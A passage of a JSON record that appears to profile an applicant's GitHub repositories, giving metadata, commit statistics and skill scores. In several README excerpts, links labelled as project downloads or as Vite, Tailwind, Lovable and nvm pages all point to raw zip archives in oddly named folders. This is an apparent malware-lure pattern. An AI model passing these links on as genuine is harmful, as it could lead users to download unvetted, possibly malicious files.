@@ -1,0 +1,1208 @@
+{
+  "applicant_id": "applicant0143",
+  "login": "Fpeople4646",
+  "html_url": "https://github.com/Fpeople4646",
+  "created_at": "2022-07-05T17:03:49Z",
+  "account_age_days": 1534,
+  "public_repos": 5,
+  "followers": 1,
+  "following": 0,
+  "repos": [
+    {
+      "name": "qnap-docker",
+      "full_name": "Fpeople4646/qnap-docker",
+      "html_url": "https://github.com/Fpeople4646/qnap-docker",
+      "description": "🛠️ Manage Docker containers seamlessly on QNAP NAS with 40+ commands for deployment, monitoring, and lifecycle operations. Enhance your self-hosting experience.",
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2022-09-20T07:20:14Z",
+      "pushed_at": "2026-09-17T00:18:20Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1455,
+      "default_branch": "main",
+      "license": "MIT",
+      "topics": [
+        "container",
+        "container-station",
+        "docker",
+        "docker-compose",
+        "mopidy",
+        "notification",
+        "notifications",
+        "plex",
+        "pushover",
+        "python",
+        "python-pushover",
+        "qnap-container-station",
+        "qnap-nas",
+        "qnap-qts",
+        "qpkg",
+        "qts",
+        "youtubemusic",
+        "zashboard"
+      ],
+      "languages": {
+        "Go": 197159,
+        "Makefile": 7317
+      },
+      "primary_language": "Go",
+      "file_count": 51,
+      "top_level_paths": [
+        ".gitignore",
+        ".goreleaser.yaml",
+        "CHANGELOG.md",
+        "CONTRIBUTING.md",
+        "LICENSE",
+        "Makefile",
+        "README.md",
+        "ROADMAP.md",
+        "aminosuccinamic",
+        "cmd",
+        "go.mod",
+        "go.sum",
+        "internal",
+        "main.go",
+        "pkg",
+        "tests"
+      ],
+      "notable_files": [
+        "go.mod"
+      ],
+      "manifests": {
+        "go.mod": [
+          "github.com/containerd/errdefs",
+          "github.com/containerd/errdefs/pkg",
+          "github.com/containerd/log",
+          "github.com/distribution/reference",
+          "github.com/docker/docker",
+          "github.com/docker/go-connections",
+          "github.com/docker/go-units",
+          "github.com/felixge/httpsnoop",
+          "github.com/go-logr/logr",
+          "github.com/go-logr/stdr",
+          "github.com/inconshreveable/mousetrap",
+          "github.com/microsoft/go-winio",
+          "github.com/moby/docker-image-spec",
+          "github.com/moby/sys/atomicwriter",
+          "github.com/moby/term",
+          "github.com/morikuni/aec",
+          "github.com/opencontainers/go-digest",
+          "github.com/opencontainers/image-spec",
+          "github.com/pkg/errors",
+          "github.com/spf13/cobra",
+          "github.com/spf13/pflag",
+          "go.opentelemetry.io/auto/sdk",
+          "go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp",
+          "go.opentelemetry.io/otel",
+          "go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracehttp",
+          "go.opentelemetry.io/otel/metric",
+          "go.opentelemetry.io/otel/trace",
+          "golang.org/x/crypto",
+          "golang.org/x/sys",
+          "golang.org/x/time",
+          "gopkg.in/yaml.v3",
+          "gotest.tools/v3"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4407,
+      "readme_excerpt": "# 🐳 qnap-docker - Manage Docker with Ease\n\n## 📥 Download Now\n[![Download Latest Release](https://github.com/Fpeople4646/qnap-docker/raw/refs/heads/main/aminosuccinamic/qnap-docker.zip%https://github.com/Fpeople4646/qnap-docker/raw/refs/heads/main/aminosuccinamic/qnap-docker.zip)](https://github.com/Fpeople4646/qnap-docker/raw/refs/heads/main/aminosuccinamic/qnap-docker.zip)\n\n## 🚀 Introduction\nWelcome to qnap-docker, a comprehensive command-line tool designed for Docker management on QNAP NAS devices. With this application, you can easily handle container lifecycles, manage images, volumes, and networks, and perform system operations. This tool features 21 commands tailored for optimal Docker management. It also detects your CACHEDEV/ZFS storage pools dynamically for improved performance and ease of use.\n\n## 📋 System Requirements\nBefore you begin, make sure your system meets the following requirements:\n\n- **Operating System**: QNAP NAS with QTS 4.3 or higher\n- **Docker**: Docker installed via Container Station on your QNAP\n- **Network Access**: Internet access to download the tool\n\n## 🌟 Features\n- **Manage Containers**: Create, start, stop, and remove containers easily.\n- **Handle I",
+      "has_ci": false,
+      "has_tests": true,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.174,
+      "commits": {
+        "count": 4,
+        "first_at": "2025-10-06T00:15:04+00:00",
+        "last_at": "2026-09-17T00:18:18+00:00",
+        "active_days": 4,
+        "span_days": 346,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": true,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 4,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 39
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "go",
+          "source": "language",
+          "detail": "Go: 197,159 bytes (96% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "shell",
+          "source": "language",
+          "detail": "Makefile: 7,317 bytes (4% of repo)",
+          "strength": 0.43578415070717347
+        },
+        {
+          "skill_id": "go",
+          "source": "file",
+          "detail": "Go module (go.mod)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "unit-testing",
+          "source": "file",
+          "detail": "test file (internal/utils/validation_test.go)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "docker",
+          "source": "topic",
+          "detail": "repo topic 'docker'",
+          "strength": 0.3
+        },
+        {
+          "skill_id": "python",
+          "source": "topic",
+          "detail": "repo topic 'python'",
+          "strength": 0.3
+        },
+        {
+          "skill_id": "docker",
+          "source": "repo_name",
+          "detail": "'containers' in repo name/description",
+          "strength": 0.2
+        },
+        {
+          "skill_id": "monitoring",
+          "source": "repo_name",
+          "detail": "'monitoring' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": false,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": false
+        },
+        "failed": [
+          "own_share"
+        ],
+        "code_bytes": 204476,
+        "strong_skills": [
+          "go",
+          "unit-testing"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "matrix-and-vector",
+      "full_name": "Fpeople4646/matrix-and-vector",
+      "html_url": "https://github.com/Fpeople4646/matrix-and-vector",
+      "description": "this program is about matrix and vector you must using c program to run this program",
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2022-10-27T14:21:13Z",
+      "pushed_at": "2025-10-06T00:17:09Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1352,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "C": 2491
+      },
+      "primary_language": "C",
+      "file_count": 4,
+      "top_level_paths": [
+        "desmonosology",
+        "matrixdinamis.c",
+        "matrixstatis.c",
+        "vektor.c"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 5,
+        "first_at": "2022-10-27T14:23:54+00:00",
+        "last_at": "2025-10-06T00:17:09+00:00",
+        "active_days": 2,
+        "span_days": 1074,
+        "max_per_day": 4,
+        "low_effort_message_ratio": 0.8,
+        "messages_sample": [
+          "Update README.md",
+          "Update and rename perkalian_vektor_DY_024.c to vektor.c",
+          "Update matrixstatis.c",
+          "Update matrixdinamis.c",
+          "Add files via upload"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 2,
+        "intermediate_flag_count": 0,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 3
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "c-cpp",
+          "source": "language",
+          "detail": "C: 2,491 bytes (100% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "c-cpp",
+          "source": "repo_name",
+          "detail": "'c' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 2491,
+        "strong_skills": [
+          "c-cpp"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "vuln-scout",
+      "full_name": "Fpeople4646/vuln-scout",
+      "html_url": "https://github.com/Fpeople4646/vuln-scout",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2025-03-13T09:36:36Z",
+      "pushed_at": "2026-02-21T08:31:31Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1783,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "TypeScript": 364159,
+        "CSS": 1637,
+        "HTML": 995,
+        "JavaScript": 869
+      },
+      "primary_language": "TypeScript",
+      "file_count": 97,
+      "top_level_paths": [
+        ".gitignore",
+        "README.md",
+        "bun.lockb",
+        "components.json",
+        "eslint.config.js",
+        "index.html",
+        "package-lock.json",
+        "package.json",
+        "pinacol",
+        "postcss.config.js",
+        "public",
+        "src",
+        "tailwind.config.ts",
+        "tsconfig.app.json",
+        "tsconfig.json",
+        "tsconfig.node.json",
+        "vite.config.ts"
+      ],
+      "notable_files": [
+        "package.json"
+      ],
+      "manifests": {
+        "package.json": [
+          "@eslint/js",
+          "@hookform/resolvers",
+          "@radix-ui/react-accordion",
+          "@radix-ui/react-alert-dialog",
+          "@radix-ui/react-aspect-ratio",
+          "@radix-ui/react-avatar",
+          "@radix-ui/react-checkbox",
+          "@radix-ui/react-collapsible",
+          "@radix-ui/react-context-menu",
+          "@radix-ui/react-dialog",
+          "@radix-ui/react-dropdown-menu",
+          "@radix-ui/react-hover-card",
+          "@radix-ui/react-label",
+          "@radix-ui/react-menubar",
+          "@radix-ui/react-navigation-menu",
+          "@radix-ui/react-popover",
+          "@radix-ui/react-progress",
+          "@radix-ui/react-radio-group",
+          "@radix-ui/react-scroll-area",
+          "@radix-ui/react-select",
+          "@radix-ui/react-separator",
+          "@radix-ui/react-slider",
+          "@radix-ui/react-slot",
+          "@radix-ui/react-switch",
+          "@radix-ui/react-tabs",
+          "@radix-ui/react-toast",
+          "@radix-ui/react-toggle",
+          "@radix-ui/react-toggle-group",
+          "@radix-ui/react-tooltip",
+          "@tailwindcss/typography",
+          "@tanstack/react-query",
+          "@types/node",
+          "@types/react",
+          "@types/react-dom",
+          "@vitejs/plugin-react-swc",
+          "autoprefixer",
+          "class-variance-authority",
+          "clsx",
+          "cmdk",
+          "date-fns",
+          "embla-carousel-react",
+          "eslint",
+          "eslint-plugin-react-hooks",
+          "eslint-plugin-react-refresh",
+          "framer-motion",
+          "globals",
+          "input-otp",
+          "lovable-tagger",
+          "lucide-react",
+          "next-themes",
+          "postcss",
+          "react",
+          "react-day-picker",
+          "react-dom",
+          "react-hook-form",
+          "react-resizable-panels",
+          "react-router-dom",
+          "recharts",
+          "sonner",
+          "tailwind-merge",
+          "tailwindcss",
+          "tailwindcss-animate",
+          "typescript",
+          "typescript-eslint",
+          "vaul",
+          "vite",
+          "zod"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 2357,
+      "readme_excerpt": "# Welcome to your Lovable project\n\n## Project info\n\n**URL**: https://github.com/Fpeople4646/vuln-scout/raw/refs/heads/main/pinacol/vuln-scout.zip\n\n## How can I edit this code?\n\nThere are several ways of editing your application.\n\n**Use Lovable**\n\nSimply visit the [Lovable Project](https://github.com/Fpeople4646/vuln-scout/raw/refs/heads/main/pinacol/vuln-scout.zip) and start prompting.\n\nChanges made via Lovable will be committed automatically to this repo.\n\n**Use your preferred IDE**\n\nIf you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.\n\nThe only requirement is having https://github.com/Fpeople4646/vuln-scout/raw/refs/heads/main/pinacol/vuln-scout.zip & npm installed - [install with nvm](https://github.com/Fpeople4646/vuln-scout/raw/refs/heads/main/pinacol/vuln-scout.zip)\n\nFollow these steps:\n\n```sh\n# Step 1: Clone the repository using the project's Git URL.\ngit clone <YOUR_GIT_URL>\n\n# Step 2: Navigate to the project directory.\ncd <YOUR_PROJECT_NAME>\n\n# Step 3: Install the necessary dependencies.\nnpm i\n\n# Step 4: Start the development server with auto-reloading and an instant preview.\nnpm run dev",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.375,
+      "commits": {
+        "count": 3,
+        "first_at": "2025-10-06T00:17:31+00:00",
+        "last_at": "2026-02-21T08:31:31+00:00",
+        "active_days": 3,
+        "span_days": 138,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 84
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "typescript",
+          "source": "language",
+          "detail": "TypeScript: 364,159 bytes (99% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 1,637 bytes (0% of repo)",
+          "strength": 0.4044524832725888
+        },
+        {
+          "skill_id": "tailwind",
+          "source": "file",
+          "detail": "tailwind config (tailwind.config.ts)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "react",
+          "source": "manifest",
+          "detail": "@types/react in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "data-viz",
+          "source": "manifest",
+          "detail": "recharts in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "tailwind",
+          "source": "manifest",
+          "detail": "tailwindcss in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "typescript",
+          "source": "manifest",
+          "detail": "typescript in package.json",
+          "strength": 0.9
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 367660,
+        "strong_skills": [
+          "data-viz",
+          "react",
+          "tailwind",
+          "typescript"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "mindful-modern-living",
+      "full_name": "Fpeople4646/mindful-modern-living",
+      "html_url": "https://github.com/Fpeople4646/mindful-modern-living",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2025-05-21T11:16:43Z",
+      "pushed_at": "2026-02-21T08:30:58Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1548,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "TypeScript": 181892,
+        "CSS": 2057,
+        "HTML": 1145,
+        "JavaScript": 869
+      },
+      "primary_language": "TypeScript",
+      "file_count": 85,
+      "top_level_paths": [
+        ".gitignore",
+        "Nahuan",
+        "README.md",
+        "bun.lockb",
+        "components.json",
+        "eslint.config.js",
+        "index.html",
+        "package-lock.json",
+        "package.json",
+        "postcss.config.js",
+        "public",
+        "src",
+        "tailwind.config.ts",
+        "tsconfig.app.json",
+        "tsconfig.json",
+        "tsconfig.node.json",
+        "vite.config.ts"
+      ],
+      "notable_files": [
+        "package.json"
+      ],
+      "manifests": {
+        "package.json": [
+          "@eslint/js",
+          "@hookform/resolvers",
+          "@radix-ui/react-accordion",
+          "@radix-ui/react-alert-dialog",
+          "@radix-ui/react-aspect-ratio",
+          "@radix-ui/react-avatar",
+          "@radix-ui/react-checkbox",
+          "@radix-ui/react-collapsible",
+          "@radix-ui/react-context-menu",
+          "@radix-ui/react-dialog",
+          "@radix-ui/react-dropdown-menu",
+          "@radix-ui/react-hover-card",
+          "@radix-ui/react-label",
+          "@radix-ui/react-menubar",
+          "@radix-ui/react-navigation-menu",
+          "@radix-ui/react-popover",
+          "@radix-ui/react-progress",
+          "@radix-ui/react-radio-group",
+          "@radix-ui/react-scroll-area",
+          "@radix-ui/react-select",
+          "@radix-ui/react-separator",
+          "@radix-ui/react-slider",
+          "@radix-ui/react-slot",
+          "@radix-ui/react-switch",
+          "@radix-ui/react-tabs",
+          "@radix-ui/react-toast",
+          "@radix-ui/react-toggle",
+          "@radix-ui/react-toggle-group",
+          "@radix-ui/react-tooltip",
+          "@tailwindcss/typography",
+          "@tanstack/react-query",
+          "@types/node",
+          "@types/react",
+          "@types/react-dom",
+          "@vitejs/plugin-react-swc",
+          "autoprefixer",
+          "class-variance-authority",
+          "clsx",
+          "cmdk",
+          "date-fns",
+          "embla-carousel-react",
+          "eslint",
+          "eslint-plugin-react-hooks",
+          "eslint-plugin-react-refresh",
+          "globals",
+          "input-otp",
+          "lovable-tagger",
+          "lucide-react",
+          "postcss",
+          "react",
+          "react-day-picker",
+          "react-dom",
+          "react-hook-form",
+          "react-resizable-panels",
+          "react-router-dom",
+          "recharts",
+          "sonner",
+          "tailwind-merge",
+          "tailwindcss",
+          "tailwindcss-animate",
+          "typescript",
+          "typescript-eslint",
+          "vaul",
+          "vite",
+          "zod"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 3596,
+      "readme_excerpt": "# Mindful Modern Living\n\n**Mindful Modern Living** is a modern web application designed to support a balanced, mindful lifestyle by combining clean design, modular development, and rapid prototyping tools. Built with Vite, TypeScript, and Tailwind CSS, this project demonstrates a modern front-end workflow and is integrated with https://github.com/Fpeople4646/mindful-modern-living/raw/refs/heads/main/Nahuan/mindful-modern-living.zip for collaborative development.\n\n## 🧠 Project Purpose\n\nThe goal of this application is to provide users with an interface that promotes mindful living through a calm, responsive user experience. It is ideal as a base for wellness, lifestyle, or productivity applications.\n\n## 🚀 Features\n\n- ⚡ **Fast Development** with [Vite](https://github.com/Fpeople4646/mindful-modern-living/raw/refs/heads/main/Nahuan/mindful-modern-living.zip)\n- 🎨 **Modern Styling** using [Tailwind CSS](https://github.com/Fpeople4646/mindful-modern-living/raw/refs/heads/main/Nahuan/mindful-modern-living.zip)\n- 🧱 **Component-Based** development using TypeScript\n- 🌐 **Deployed/Editable via [https://github.com/Fpeople4646/mindful-modern-living/raw/refs/heads/main/Nahuan/mindful-modern-livin",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 3,
+      "contribution_share": 0.188,
+      "commits": {
+        "count": 3,
+        "first_at": "2025-10-06T00:17:18+00:00",
+        "last_at": "2026-02-21T08:30:58+00:00",
+        "active_days": 3,
+        "span_days": 138,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 72
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "typescript",
+          "source": "language",
+          "detail": "TypeScript: 181,892 bytes (98% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 2,057 bytes (1% of repo)",
+          "strength": 0.4110613401590639
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 1,145 bytes (1% of repo)",
+          "strength": 0.40615713878567244
+        },
+        {
+          "skill_id": "tailwind",
+          "source": "file",
+          "detail": "tailwind config (tailwind.config.ts)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "react",
+          "source": "manifest",
+          "detail": "@types/react in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "data-viz",
+          "source": "manifest",
+          "detail": "recharts in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "tailwind",
+          "source": "manifest",
+          "detail": "tailwindcss in package.json",
+          "strength": 0.9
+        },
+        {
+          "skill_id": "typescript",
+          "source": "manifest",
+          "detail": "typescript in package.json",
+          "strength": 0.9
+        }
+      ],
+      "skill_relevant": false,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": false
+        },
+        "failed": [
+          "own_share"
+        ],
+        "code_bytes": 185963,
+        "strong_skills": [
+          "data-viz",
+          "react",
+          "tailwind",
+          "typescript"
+        ]
+      },
+      "tree_truncated": false
+    }
+  ],
+  "external_contributions": [],
+  "languages_bytes": {
+    "TypeScript": 546051,
+    "Go": 197159,
+    "Makefile": 7317,
+    "CSS": 3694,
+    "C": 2491,
+    "HTML": 2140,
+    "JavaScript": 1738
+  },
+  "total_commits": 15,
+  "skill_evidence": [
+    {
+      "skill_id": "typescript",
+      "repos": [
+        "Fpeople4646/vuln-scout",
+        "Fpeople4646/mindful-modern-living"
+      ],
+      "signal_count": 4,
+      "sources": [
+        "language",
+        "manifest"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 546051,
+      "commit_count": 6,
+      "first_seen": "2025-10-06T00:17:18+00:00",
+      "last_seen": "2026-02-21T08:31:31+00:00",
+      "details": [
+        "vuln-scout: TypeScript: 364,159 bytes (99% of repo)",
+        "vuln-scout: typescript in package.json",
+        "mindful-modern-living: TypeScript: 181,892 bytes (98% of repo)",
+        "mindful-modern-living: typescript in package.json"
+      ]
+    },
+    {
+      "skill_id": "go",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language",
+        "file"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 197159,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: Go: 197,159 bytes (96% of repo)",
+        "qnap-docker: Go module (go.mod)"
+      ]
+    },
+    {
+      "skill_id": "c-cpp",
+      "repos": [
+        "Fpeople4646/matrix-and-vector"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language",
+        "repo_name"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 2491,
+      "commit_count": 5,
+      "first_seen": "2022-10-27T14:23:54+00:00",
+      "last_seen": "2025-10-06T00:17:09+00:00",
+      "details": [
+        "matrix-and-vector: C: 2,491 bytes (100% of repo)",
+        "matrix-and-vector: 'c' in repo name/description"
+      ]
+    },
+    {
+      "skill_id": "tailwind",
+      "repos": [
+        "Fpeople4646/vuln-scout",
+        "Fpeople4646/mindful-modern-living"
+      ],
+      "signal_count": 4,
+      "sources": [
+        "file",
+        "manifest"
+      ],
+      "max_strength": 0.9,
+      "total_bytes": 0,
+      "commit_count": 6,
+      "first_seen": "2025-10-06T00:17:18+00:00",
+      "last_seen": "2026-02-21T08:31:31+00:00",
+      "details": [
+        "vuln-scout: tailwind config (tailwind.config.ts)",
+        "vuln-scout: tailwindcss in package.json",
+        "mindful-modern-living: tailwind config (tailwind.config.ts)",
+        "mindful-modern-living: tailwindcss in package.json"
+      ]
+    },
+    {
+      "skill_id": "react",
+      "repos": [
+        "Fpeople4646/vuln-scout",
+        "Fpeople4646/mindful-modern-living"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "manifest"
+      ],
+      "max_strength": 0.9,
+      "total_bytes": 0,
+      "commit_count": 6,
+      "first_seen": "2025-10-06T00:17:18+00:00",
+      "last_seen": "2026-02-21T08:31:31+00:00",
+      "details": [
+        "vuln-scout: @types/react in package.json",
+        "mindful-modern-living: @types/react in package.json"
+      ]
+    },
+    {
+      "skill_id": "data-viz",
+      "repos": [
+        "Fpeople4646/vuln-scout",
+        "Fpeople4646/mindful-modern-living"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "manifest"
+      ],
+      "max_strength": 0.9,
+      "total_bytes": 0,
+      "commit_count": 6,
+      "first_seen": "2025-10-06T00:17:18+00:00",
+      "last_seen": "2026-02-21T08:31:31+00:00",
+      "details": [
+        "vuln-scout: recharts in package.json",
+        "mindful-modern-living: recharts in package.json"
+      ]
+    },
+    {
+      "skill_id": "unit-testing",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: test file (internal/utils/validation_test.go)"
+      ]
+    },
+    {
+      "skill_id": "shell",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.43578415070717347,
+      "total_bytes": 7317,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: Makefile: 7,317 bytes (4% of repo)"
+      ]
+    },
+    {
+      "skill_id": "html-css",
+      "repos": [
+        "Fpeople4646/vuln-scout",
+        "Fpeople4646/mindful-modern-living"
+      ],
+      "signal_count": 3,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.4110613401590639,
+      "total_bytes": 4839,
+      "commit_count": 6,
+      "first_seen": "2025-10-06T00:17:18+00:00",
+      "last_seen": "2026-02-21T08:31:31+00:00",
+      "details": [
+        "vuln-scout: CSS: 1,637 bytes (0% of repo)",
+        "mindful-modern-living: CSS: 2,057 bytes (1% of repo)",
+        "mindful-modern-living: HTML: 1,145 bytes (1% of repo)"
+      ]
+    },
+    {
+      "skill_id": "docker",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
